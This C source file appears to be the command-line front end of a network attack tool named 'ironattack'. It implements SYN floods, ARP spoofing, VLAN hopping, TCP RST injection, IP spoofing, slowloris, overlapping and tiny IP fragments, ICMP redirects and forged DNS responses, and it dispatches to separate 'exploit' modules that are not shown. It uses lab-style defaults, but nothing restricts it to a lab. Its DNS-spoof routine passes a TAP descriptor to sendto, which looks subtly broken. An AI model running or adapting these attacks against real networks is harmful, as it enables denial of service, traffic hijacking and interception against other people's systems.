#include "craft.h"
#include "dns_spoof_ext.h"
#include "exploit.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>

static void usage(void) {
    fprintf(stderr, "Usage: ironattack <command> [options]\n\n");
    fprintf(stderr, "Commands:\n");
    fprintf(stderr, "  syn-flood  --target <ip> --port <port> [--rate <pps>] [--count <n>] [--iface <name>]\n");
    fprintf(stderr, "  arp-spoof  --target <ip> --impersonate <ip> [--iface <name>] [--count <n>]\n");
    fprintf(stderr, "  vlan-hop   --target <ip> --target-vlan <vid> [--outer-vlan <vid>] [--iface <name>] [--count <n>]\n");
    fprintf(stderr, "  rst-inject --target <ip> --port <port> --src <ip> --sport <port> [--seq <n>] [--count <n>] [--iface <name>]\n");
    fprintf(stderr, "  ip-spoof   --src <ip> --dst <ip> --port <port> [--count <n>] [--iface <name>]\n");
    fprintf(stderr, "  slowloris  --target <ip> --port <port> [--conns <n>] [--iface <name>]\n");
    fprintf(stderr, "  frag-attack --target <ip> [--overlap] [--tiny] [--iface <name>] [--count <n>]\n");
    fprintf(stderr, "  icmp-redirect --target <ip> --new-gw <ip> --orig-dst <ip> [--count <n>] [--iface <name>]\n");
    fprintf(stderr, "  dns-spoof  --domain <name> --fake-ip <ip> --target <ip> [--count <n>] [--iface <name>]\n");
    fprintf(stderr, "  dns-spoof-ext --domain <name> --fake-ip <ip> --target <ip> [--count <n>] [--iface <name>]\n");
    fprintf(stderr, "  exploit  --target <ip> [--mode crash|pattern|payload|fmtstr] [--size <n>]\n");
    fprintf(stderr, "\nAll commands require sudo (raw socket access).\n");
}

static uint32_t parse_ip(const char *s) {
    struct in_addr addr;
    if (inet_pton(AF_INET, s, &addr) != 1) return 0;
    return addr.s_addr; /* already network byte order */
}

static uint32_t g_rand_state = 0;
static uint32_t fast_rand(void) {
    g_rand_state = g_rand_state * 1103515245 + 12345;
    return g_rand_state;
}

static int cmd_syn_flood(int argc, char **argv) {
    const char *target_str = NULL;
    const char *iface = "iron0";
    uint16_t port = 7;
    int rate = 1000;
    int count = 5000;

    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "--target") == 0 && i + 1 < argc) target_str = argv[++i];
        else if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) port = atoi(argv[++i]);
        else if (strcmp(argv[i], "--rate") == 0 && i + 1 < argc) rate = atoi(argv[++i]);
        else if (strcmp(argv[i], "--count") == 0 && i + 1 < argc) count = atoi(argv[++i]);
        else if (strcmp(argv[i], "--iface") == 0 && i + 1 < argc) iface = argv[++i];
    }

    if (!target_str) {
        fprintf(stderr, "Error: --target required\n");
        return 1;
    }

    uint32_t dst_ip = parse_ip(target_str);
    if (dst_ip == 0) {
        fprintf(stderr, "Error: invalid target IP '%s'\n", target_str);
        return 1;
    }

    int fd = tap_open(iface);
    if (fd < 0) {
        fprintf(stderr, "Error: cannot open TAP '%s' (run with sudo)\n", iface);
        return 1;
    }

    printf("=== SYN Flood Attack ===\n");
    printf("  Target:  %s:%d\n", target_str, port);
    printf("  Iface:   %s\n", iface);
    printf("  Rate:    %d pps\n", rate);
    printf("  Count:   %d\n", count);
    printf("\n");

    uint8_t src_mac[6] = {0x02, 0xAA, 0xBB, 0xCC, 0x00, 0x01};
    uint8_t dst_mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01}; /* router MAC */
    uint8_t frame[128];

    g_rand_state = (uint32_t)time(NULL);
    int usleep_interval = (rate > 0) ? (1000000 / rate) : 0;
    int sent = 0;

    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);

    for (int i = 0; i < count; i++) {
        /* Random source IP: 192.168.X.Y */
        uint32_t src_ip = htonl(0xC0A80000 | (fast_rand() & 0xFFFF));
        uint16_t src_port = 10000 + (fast_rand() % 55000);
        uint32_t seq = fast_rand();

        int len = craft_tcp_syn(frame, sizeof(frame),
                                src_mac, dst_mac,
                                src_ip, dst_ip,
                                src_port, port, seq);
        if (len > 0) {
            tap_write(fd, frame, len);
            sent++;
        }

        if (usleep_interval > 0) usleep(usleep_interval);
    }

    clock_gettime(CLOCK_MONOTONIC, &end);
    double elapsed = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;

    printf("  Sent:    %d packets\n", sent);
    printf("  Elapsed: %.2f s\n", elapsed);
    printf("  Rate:    %.0f pps\n", sent / (elapsed > 0 ? elapsed : 1));
    printf("\n");

    close(fd);
    return 0;
}

static int cmd_arp_spoof(int argc, char **argv) {
    const char *target_str = NULL;
    const char *impersonate_str = NULL;
    const char *iface = "iron0";
    int count = 10;

    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "--target") == 0 && i + 1 < argc) target_str = argv[++i];
        else if (strcmp(argv[i], "--impersonate") == 0 && i + 1 < argc) impersonate_str = argv[++i];
        else if (strcmp(argv[i], "--iface") == 0 && i + 1 < argc) iface = argv[++i];
        else if (strcmp(argv[i], "--count") == 0 && i + 1 < argc) count = atoi(argv[++i]);
    }

    if (!target_str || !impersonate_str) {
        fprintf(stderr, "Error: --target and --impersonate required\n");
        return 1;
    }

    uint32_t target_ip = parse_ip(target_str);
    uint32_t spoof_ip = parse_ip(impersonate_str);
    if (!target_ip || !spoof_ip) { fprintf(stderr, "Invalid IP\n"); return 1; }

    int fd = tap_open(iface);
    if (fd < 0) { fprintf(stderr, "Error: cannot open '%s' (run with sudo)\n", iface); return 1; }

    printf("=== ARP Spoof Attack ===\n");
    printf("  Target:      %s\n", target_str);
    printf("  Impersonate: %s\n", impersonate_str);
    printf("  Iface:       %s\n", iface);
    printf("  Count:       %d\n\n", count);

    uint8_t attacker_mac[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
    uint8_t dst_mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01}; /* router MAC */
    uint8_t frame[64];
    int sent = 0;

    for (int i = 0; i < count; i++) {
        /* "spoof_ip is at attacker_mac" sent to target */
        int len = craft_arp_reply(frame, sizeof(frame),
                                  attacker_mac, dst_mac,
                                  spoof_ip, attacker_mac,
                                  target_ip, dst_mac);
        if (len > 0) { tap_write(fd, frame, len); sent++; }
        usleep(1000000); /* 1 per second */
    }

    printf("  Sent: %d ARP replies\n\n", sent);
    close(fd);
    return 0;
}

static int cmd_vlan_hop(int argc, char **argv) {
    const char *target_str = NULL;
    const char *iface = "iron0";
    uint16_t target_vlan = 20;
    uint16_t outer_vlan = 1; /* native VLAN */
    int count = 10;

    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "--target") == 0 && i + 1 < argc) target_str = argv[++i];
        else if (strcmp(argv[i], "--target-vlan") == 0 && i + 1 < argc) target_vlan = atoi(argv[++i]);
        else if (strcmp(argv[i], "--outer-vlan") == 0 && i + 1 < argc) outer_vlan = atoi(argv[++i]);
        else if (strcmp(argv[i], "--iface") == 0 && i + 1 < argc) iface = argv[++i];
        else if (strcmp(argv[i], "--count") == 0 && i + 1 < argc) count = atoi(argv[++i]);
    }

    if (!target_str) { fprintf(stderr, "Error: --target required\n"); return 1; }

    uint32_t dst_ip = parse_ip(target_str);
    if (!dst_ip) { fprintf(stderr, "Invalid IP\n"); return 1; }

    int fd = tap_open(iface);
    if (fd < 0) { fprintf(stderr, "Error: cannot open '%s' (run with sudo)\n", iface); return 1; }

    printf("=== VLAN Hopping Attack ===\n");
    printf("  Target:      %s\n", target_str);
    printf("  Outer VLAN:  %d (native)\n", outer_vlan);
    printf("  Inner VLAN:  %d (target)\n", target_vlan);
    printf("  Iface:       %s\n", iface);
    printf("  Count:       %d\n\n", count);

    uint8_t src_mac[6] = {0x02, 0xAA, 0xBB, 0xCC, 0x00, 0x02};
    uint8_t dst_mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
    uint32_t src_ip = htonl(0xC0A80A01); /* 192.168.10.1 */
    uint8_t frame[128];
    int sent = 0;

    for (int i = 0; i < count; i++) {
        int len = craft_double_tagged(frame, sizeof(frame),
                                      src_mac, dst_mac,
                                      outer_vlan, target_vlan,
                                      src_ip, dst_ip);
        if (len > 0) { tap_write(fd, frame, len); sent++; }
        usleep(100000); /* 10 per second */
    }

    printf("  Sent: %d double-tagged frames\n\n", sent);
    close(fd);
    return 0;
}

static int cmd_rst_inject(int argc, char **argv) {
    const char *target_str = NULL, *src_str = NULL;
    const char *iface = "iron0";
    uint16_t port = 7, sport = 54321;
    uint32_t seq = 1000;
    int count = 10;

    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "--target") == 0 && i + 1 < argc) target_str = argv[++i];
        else if (strcmp(argv[i], "--src") == 0 && i + 1 < argc) src_str = argv[++i];
        else if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) port = atoi(argv[++i]);
        else if (strcmp(argv[i], "--sport") == 0 && i + 1 < argc) sport = atoi(argv[++i]);
        else if (strcmp(argv[i], "--seq") == 0 && i + 1 < argc) seq = (uint32_t)atol(argv[++i]);
        else if (strcmp(argv[i], "--count") == 0 && i + 1 < argc) count = atoi(argv[++i]);
        else if (strcmp(argv[i], "--iface") == 0 && i + 1 < argc) iface = argv[++i];
    }

    if (!target_str || !src_str) {
        fprintf(stderr, "Error: --target and --src required\n"); return 1;
    }

    uint32_t dst_ip = parse_ip(target_str);
    uint32_t src_ip = parse_ip(src_str);
    if (!dst_ip || !src_ip) { fprintf(stderr, "Invalid IP\n"); return 1; }

    int fd = tap_open(iface);
    if (fd < 0) { fprintf(stderr, "Error: cannot open '%s'\n", iface); return 1; }

    printf("=== TCP RST Injection ===\n");
    printf("  Target:  %s:%d\n", target_str, port);
    printf("  Spoof:   %s:%d\n", src_str, sport);
    printf("  Seq:     %u\n", seq);
    printf("  Count:   %d\n\n", count);

    uint8_t src_mac[6] = {0x02, 0xAA, 0xBB, 0xCC, 0x00, 0x03};
    uint8_t dst_mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
    uint8_t frame[128];
    int sent = 0;

    for (int i = 0; i < count; i++) {
        int len = craft_tcp_rst(frame, sizeof(frame),
                                src_mac, dst_mac,
                                src_ip, dst_ip,
                                sport, port, seq + i);
        if (len > 0) { tap_write(fd, frame, len); sent++; }
        usleep(10000);
    }

    printf("  Sent: %d RST packets\n\n", sent);
    close(fd);
    return 0;
}

static int cmd_ip_spoof(int argc, char **argv) {
    const char *src_str = NULL, *dst_str = NULL;
    const char *iface = "iron0";
    uint16_t port = 7;
    int count = 10;

    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "--src") == 0 && i + 1 < argc) src_str = argv[++i];
        else if (strcmp(argv[i], "--dst") == 0 && i + 1 < argc) dst_str = argv[++i];
        else if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) port = atoi(argv[++i]);
        else if (strcmp(argv[i], "--count") == 0 && i + 1 < argc) count = atoi(argv[++i]);
        else if (strcmp(argv[i], "--iface") == 0 && i + 1 < argc) iface = argv[++i];
    }

    if (!src_str || !dst_str) {
        fprintf(stderr, "Error: --src and --dst required\n"); return 1;
    }

    uint32_t src_ip = parse_ip(src_str);
    uint32_t dst_ip = parse_ip(dst_str);
    if (!src_ip || !dst_ip) { fprintf(stderr, "Invalid IP\n"); return 1; }

    int fd = tap_open(iface);
    if (fd < 0) { fprintf(stderr, "Error: cannot open '%s'\n", iface); return 1; }

    printf("=== IP Spoofing Attack ===\n");
    printf("  Spoofed src: %s\n", src_str);
    printf("  Target:      %s:%d\n", dst_str, port);
    printf("  Count:       %d\n\n", count);

    uint8_t src_mac[6] = {0x02, 0xAA, 0xBB, 0xCC, 0x00, 0x04};
    uint8_t dst_mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
    uint8_t frame[128];
    g_rand_state = (uint32_t)time(NULL);
    int sent = 0;

    for (int i = 0; i < count; i++) {
        uint16_t sport = 10000 + (fast_rand() % 55000);
        int len = craft_tcp_syn(frame, sizeof(frame),
                                src_mac, dst_mac,
                                src_ip, dst_ip,
                                sport, port, fast_rand());
        if (len > 0) { tap_write(fd, frame, len); sent++; }
        usleep(10000);
    }

    printf("  Sent: %d spoofed SYN packets\n\n", sent);
    close(fd);
    return 0;
}

static int cmd_slowloris(int argc, char **argv) {
    const char *target_str = NULL;
    const char *iface = "iron0";
    uint16_t port = 8080;
    int conns = 50;

    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "--target") == 0 && i + 1 < argc) target_str = argv[++i];
        else if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) port = atoi(argv[++i]);
        else if (strcmp(argv[i], "--conns") == 0 && i + 1 < argc) conns = atoi(argv[++i]);
        else if (strcmp(argv[i], "--iface") == 0 && i + 1 < argc) iface = argv[++i];
    }

    if (!target_str) { fprintf(stderr, "Error: --target required\n"); return 1; }
    uint32_t dst_ip = parse_ip(target_str);
    if (!dst_ip) { fprintf(stderr, "Invalid IP\n"); return 1; }

    int fd = tap_open(iface);
    if (fd < 0) { fprintf(stderr, "Error: cannot open '%s'\n", iface); return 1; }

    printf("=== Slowloris Attack ===\n");
    printf("  Target:  %s:%d\n", target_str, port);
    printf("  Conns:   %d\n", conns);
    printf("  Iface:   %s\n\n", iface);

    uint8_t src_mac[6] = {0x02, 0xAA, 0xBB, 0xCC, 0x00, 0x05};
    uint8_t dst_mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
    uint32_t src_ip = htonl(0xC0A80A01);
    uint8_t frame[256];
    g_rand_state = (uint32_t)time(NULL);

    /* Phase 1: Open connections (send SYNs) */
    printf("  Phase 1: Opening %d connections...\n", conns);
    for (int i = 0; i < conns; i++) {
        uint16_t sport = 20000 + i;
        int len = craft_tcp_syn(frame, sizeof(frame), src_mac, dst_mac,
                                src_ip, dst_ip, sport, port, fast_rand());
        if (len > 0) tap_write(fd, frame, len);
        usleep(5000);
    }

    /* Phase 2: Send partial data slowly (keep connections alive) */
    printf("  Phase 2: Sending partial headers (1 byte every 2s)...\n");
    uint8_t partial[] = "X";
    for (int round = 0; round < 5; round++) {
        for (int i = 0; i < conns; i++) {
            uint16_t sport = 20000 + i;
            int len = craft_tcp_ack(frame, sizeof(frame), src_mac, dst_mac,
                                    src_ip, dst_ip, sport, port,
                                    1001 + round, 1001,
                                    partial, 1);
            if (len > 0) tap_write(fd, frame, len);
        }
        sleep(2);
    }

    printf("  Done: %d connections held open for ~10s\n\n", conns);
    close(fd);
    return 0;
}

static int cmd_frag_attack(int argc, char **argv) {
    const char *target_str = NULL;
    const char *iface = "iron0";
    int do_overlap = 0, do_tiny = 0;
    int count = 10;

    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "--target") == 0 && i + 1 < argc) target_str = argv[++i];
        else if (strcmp(argv[i], "--overlap") == 0) do_overlap = 1;
        else if (strcmp(argv[i], "--tiny") == 0) do_tiny = 1;
        else if (strcmp(argv[i], "--count") == 0 && i + 1 < argc) count = atoi(argv[++i]);
        else if (strcmp(argv[i], "--iface") == 0 && i + 1 < argc) iface = argv[++i];
    }

    if (!target_str) { fprintf(stderr, "Error: --target required\n"); return 1; }
    if (!do_overlap && !do_tiny) do_overlap = 1; /* default */

    uint32_t dst_ip = parse_ip(target_str);
    if (!dst_ip) { fprintf(stderr, "Invalid IP\n"); return 1; }

    int fd = tap_open(iface);
    if (fd < 0) { fprintf(stderr, "Error: cannot open '%s'\n", iface); return 1; }

    printf("=== Fragmentation Attack ===\n");
    printf("  Target:  %s\n", target_str);
    printf("  Mode:    %s%s\n", do_overlap ? "overlap " : "", do_tiny ? "tiny" : "");
    printf("  Count:   %d\n", count);
    printf("  Iface:   %s\n\n", iface);

    uint8_t src_mac[6] = {0x02, 0xAA, 0xBB, 0xCC, 0x00, 0x06};
    uint8_t dst_mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
    uint32_t src_ip = htonl(0xC0A80A01);
    uint8_t frame[256];
    uint8_t payload[64];
    memset(payload, 'A', sizeof(payload));
    int sent = 0;

    for (int i = 0; i < count; i++) {
        uint16_t id = 1000 + i;

        if (do_overlap) {
            /* Fragment 1: offset=0, 32 bytes, MF=1 */
            int len = craft_ip_fragment(frame, sizeof(frame), src_mac, dst_mac,
                                        src_ip, dst_ip, id, 0, 1, payload, 32);
            if (len > 0) { tap_write(fd, frame, len); sent++; }

            /* Fragment 2: offset=16 (overlaps with frag 1), 32 bytes, MF=0 */
            len = craft_ip_fragment(frame, sizeof(frame), src_mac, dst_mac,
                                    src_ip, dst_ip, id, 16, 0, payload, 32);
            if (len > 0) { tap_write(fd, frame, len); sent++; }
        }

        if (do_tiny) {
            /* Tiny fragment: 8 bytes payload (below minimum 48 for non-last) */
            int len = craft_ip_fragment(frame, sizeof(frame), src_mac, dst_mac,
                                        src_ip, dst_ip, id + 500, 0, 1, payload, 8);
            if (len > 0) { tap_write(fd, frame, len); sent++; }
        }

        usleep(10000);
    }

    printf("  Sent: %d fragments\n\n", sent);
    close(fd);
    return 0;
}

static int cmd_icmp_redirect(int argc, char **argv) {
    const char *target_str = NULL, *gw_str = NULL, *dst_str = NULL;
    const char *iface = "iron0";
    int count = 5;

    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "--target") == 0 && i + 1 < argc) target_str = argv[++i];
        else if (strcmp(argv[i], "--new-gw") == 0 && i + 1 < argc) gw_str = argv[++i];
        else if (strcmp(argv[i], "--orig-dst") == 0 && i + 1 < argc) dst_str = argv[++i];
        else if (strcmp(argv[i], "--count") == 0 && i + 1 < argc) count = atoi(argv[++i]);
        else if (strcmp(argv[i], "--iface") == 0 && i + 1 < argc) iface = argv[++i];
    }

    if (!target_str || !gw_str || !dst_str) {
        fprintf(stderr, "Error: --target, --new-gw and --orig-dst required\n"); return 1;
    }

    uint32_t target_ip = parse_ip(target_str);
    uint32_t new_gw    = parse_ip(gw_str);
    uint32_t orig_dst  = parse_ip(dst_str);
    if (!target_ip || !new_gw || !orig_dst) { fprintf(stderr, "Invalid IP\n"); return 1; }

    int fd = tap_open(iface);
    if (fd < 0) { fprintf(stderr, "Error: cannot open '%s'\n", iface); return 1; }

    printf("=== ICMP Redirect Attack ===\n");
    printf("  Target:   %s\n", target_str);
    printf("  New GW:   %s\n", gw_str);
    printf("  Orig dst: %s\n", dst_str);
    printf("  Count:    %d\n\n", count);

    uint8_t src_mac[6] = {0x02, 0xAA, 0xBB, 0xCC, 0x00, 0x07};
    uint8_t dst_mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
    uint8_t frame[128];
    int sent = 0;

    for (int i = 0; i < count; i++) {
        int len = craft_icmp_redirect(frame, sizeof(frame),
                                      src_mac, dst_mac,
                                      src_mac[0] ? htonl(0xC0A80A01) : 0, /* fake src */
                                      target_ip, new_gw, orig_dst);
        if (len > 0) { tap_write(fd, frame, len); sent++; }
        usleep(200000);
    }

    printf("  Sent: %d ICMP redirect messages\n\n", sent);
    close(fd);
    return 0;
}

static int cmd_dns_spoof(int argc, char **argv) {
    const char *domain = NULL, *fake_ip_str = NULL, *target_str = NULL;
    const char *iface = "iron0";
    int count = 10;

    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "--domain") == 0 && i + 1 < argc) domain = argv[++i];
        else if (strcmp(argv[i], "--fake-ip") == 0 && i + 1 < argc) fake_ip_str = argv[++i];
        else if (strcmp(argv[i], "--target") == 0 && i + 1 < argc) target_str = argv[++i];
        else if (strcmp(argv[i], "--count") == 0 && i + 1 < argc) count = atoi(argv[++i]);
        else if (strcmp(argv[i], "--iface") == 0 && i + 1 < argc) iface = argv[++i];
    }

    if (!domain || !fake_ip_str || !target_str) {
        fprintf(stderr, "Error: --domain, --fake-ip, and --target required\n"); return 1;
    }

    uint32_t fake_ip = parse_ip(fake_ip_str);
    uint32_t target_ip = parse_ip(target_str);
    if (!fake_ip || !target_ip) { fprintf(stderr, "Invalid IP\n"); return 1; }

    int fd = tap_open(iface);
    if (fd < 0) { fprintf(stderr, "Error: cannot open '%s'\n", iface); return 1; }

    printf("=== DNS Spoof Attack ===\n");
    printf("  Domain:  %s\n", domain);
    printf("  Fake IP: %s\n", fake_ip_str);
    printf("  Target:  %s\n", target_str);
    printf("  Count:   %d\n\n", count);

    /* Build forged DNS response */
    /* DNS response: header(12) + question + answer */
    uint8_t dns_resp[128];
    int dns_len = 0;

    /* DNS header */
    dns_resp[0] = 0x00; dns_resp[1] = 0x01; /* Transaction ID */
    dns_resp[2] = 0x81; dns_resp[3] = 0x80; /* Flags: response, authoritative */
    dns_resp[4] = 0x00; dns_resp[5] = 0x01; /* Questions: 1 */
    dns_resp[6] = 0x00; dns_resp[7] = 0x01; /* Answers: 1 */
    dns_resp[8] = 0x00; dns_resp[9] = 0x00; /* Authority: 0 */
    dns_resp[10] = 0x00; dns_resp[11] = 0x00; /* Additional: 0 */
    dns_len = 12;

    /* Question: encode domain name */
    const char *p = domain;
    while (*p) {
        const char *dot = strchr(p, '.');
        int label_len = dot ? (int)(dot - p) : (int)strlen(p);
        dns_resp[dns_len++] = (uint8_t)label_len;
        memcpy(dns_resp + dns_len, p, label_len);
        dns_len += label_len;
        p += label_len + (dot ? 1 : 0);
        if (!dot) break;
    }
    dns_resp[dns_len++] = 0; /* End of name */
    dns_resp[dns_len++] = 0x00; dns_resp[dns_len++] = 0x01; /* Type A */
    dns_resp[dns_len++] = 0x00; dns_resp[dns_len++] = 0x01; /* Class IN */

    /* Answer: pointer to name + Type A + Class IN + TTL + IP */
    dns_resp[dns_len++] = 0xC0; dns_resp[dns_len++] = 0x0C; /* Name pointer to offset 12 */
    dns_resp[dns_len++] = 0x00; dns_resp[dns_len++] = 0x01; /* Type A */
    dns_resp[dns_len++] = 0x00; dns_resp[dns_len++] = 0x01; /* Class IN */
    dns_resp[dns_len++] = 0x00; dns_resp[dns_len++] = 0x00;
    dns_resp[dns_len++] = 0x00; dns_resp[dns_len++] = 0x3C; /* TTL: 60s */
    dns_resp[dns_len++] = 0x00; dns_resp[dns_len++] = 0x04; /* Data length: 4 */
    memcpy(dns_resp + dns_len, &fake_ip, 4); /* The fake IP */
    dns_len += 4;

    /* Wrap in UDP + IP and send */
    /* Build: IP(20) + UDP(8) + DNS payload */
    uint8_t pkt[256];
    memset(pkt, 0, sizeof(pkt));
    int ip_total = 20 + 8 + dns_len;

    /* IP header */
    pkt[0] = 0x45;
    pkt[2] = (ip_total >> 8) & 0xFF; pkt[3] = ip_total & 0xFF;
    pkt[8] = 64; pkt[9] = 17; /* UDP */
    uint32_t src_ip = htonl(0xC0A80A01); /* 192.168.10.1 (attacker) */
    memcpy(pkt + 12, &src_ip, 4);
    memcpy(pkt + 16, &target_ip, 4);
    /* IP checksum */
    uint32_t sum = 0;
    for (int i = 0; i < 20; i += 2) sum += (pkt[i] << 8) | pkt[i+1];
    while (sum >> 16) sum = (sum >> 16) + (sum & 0xFFFF);
    uint16_t ck = ~sum & 0xFFFF;
    pkt[10] = (ck >> 8) & 0xFF; pkt[11] = ck & 0xFF;

    /* UDP header */
    uint8_t *udp = pkt + 20;
    udp[0] = 0x00; udp[1] = 0x35; /* src port 53 */
    udp[2] = 0x00; udp[3] = 0x35; /* dst port 53 */
    uint16_t udp_len = 8 + dns_len;
    udp[4] = (udp_len >> 8) & 0xFF; udp[5] = udp_len & 0xFF;
    /* UDP checksum = 0 (optional for IPv4) */
    memcpy(udp + 8, dns_resp, dns_len);

    int sent = 0;
    for (int i = 0; i < count; i++) {
        /* Vary transaction ID */
        udp[8] = (i >> 8) & 0xFF; udp[9] = i & 0xFF;

        struct sockaddr_in dst;
        memset(&dst, 0, sizeof(dst));
        dst.sin_family = AF_INET;
        dst.sin_addr.s_addr = target_ip;

        int rc = sendto(fd, pkt, ip_total, 0, (struct sockaddr *)&dst, sizeof(dst));
        if (rc > 0) sent++;
        usleep(100000);
    }

    printf("  Sent: %d forged DNS responses\n", sent);
    printf("  Payload: %s -> %s (TTL=60s)\n\n", domain, fake_ip_str);
    close(fd);
    return 0;
}

int main(int argc, char **argv) {
    if (argc < 2) {
        usage();
        return 1;
    }

    const char *cmd = argv[1];

    if (strcmp(cmd, "syn-flood") == 0) {
        return cmd_syn_flood(argc - 2, argv + 2);
    } else if (strcmp(cmd, "arp-spoof") == 0) {
        return cmd_arp_spoof(argc - 2, argv + 2);
    } else if (strcmp(cmd, "vlan-hop") == 0) {
        return cmd_vlan_hop(argc - 2, argv + 2);
    } else if (strcmp(cmd, "rst-inject") == 0) {
        return cmd_rst_inject(argc - 2, argv + 2);
    } else if (strcmp(cmd, "ip-spoof") == 0) {
        return cmd_ip_spoof(argc - 2, argv + 2);
    } else if (strcmp(cmd, "slowloris") == 0) {
        return cmd_slowloris(argc - 2, argv + 2);
    } else if (strcmp(cmd, "frag-attack") == 0) {
        return cmd_frag_attack(argc - 2, argv + 2);
    } else if (strcmp(cmd, "icmp-redirect") == 0) {
        return cmd_icmp_redirect(argc - 2, argv + 2);
    } else if (strcmp(cmd, "dns-spoof") == 0) {
        return cmd_dns_spoof(argc - 2, argv + 2);
    } else if (strcmp(cmd, "dns-spoof-ext") == 0) {
        return cmd_dns_spoof_ext(argc - 2, argv + 2);
    } else if (strcmp(cmd, "exploit") == 0) {
        return cmd_exploit(argc - 2, argv + 2);
    } else if (strcmp(cmd, "--help") == 0 || strcmp(cmd, "-h") == 0) {
        usage();
        return 0;
    } else {
        fprintf(stderr, "Unknown command: %s\n", cmd);
        usage();
        return 1;
    }
}
